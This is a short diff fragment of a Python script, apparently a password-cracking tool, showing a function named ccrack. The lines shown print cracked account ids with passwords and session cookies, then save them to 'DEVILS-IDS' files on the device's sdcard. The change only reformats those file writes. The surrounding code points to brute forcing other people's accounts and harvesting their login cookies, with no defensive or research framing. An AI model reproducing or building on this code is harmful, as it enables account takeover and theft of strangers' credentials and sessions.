@@ -960,8 +960,8 @@ def ccrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[65:80]
 				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
-                open('sdcard/DEVILS-IDS/devils_ok.txt', 'a').write(cid + '|' + ps + '\n')
-                open('sdcard/DEVILS-IDS/devils_cokie.txt', 'a').write(cid + '|' + ps + '|' + coki + '	\n')   
+                open('sdcard/DEVILS-IDS/devils_ok.txt', 'a').write(cid +'|'+ ps +'\n')
+                open('sdcard/DEVILS-IDS/devils_cokie.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')   
 				#print('\033[1;97m[DEVILS-CP] '+cid+' | '+ps+'\033[1;32m')
 				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
 				#print(f' Number or Email : {uid}')
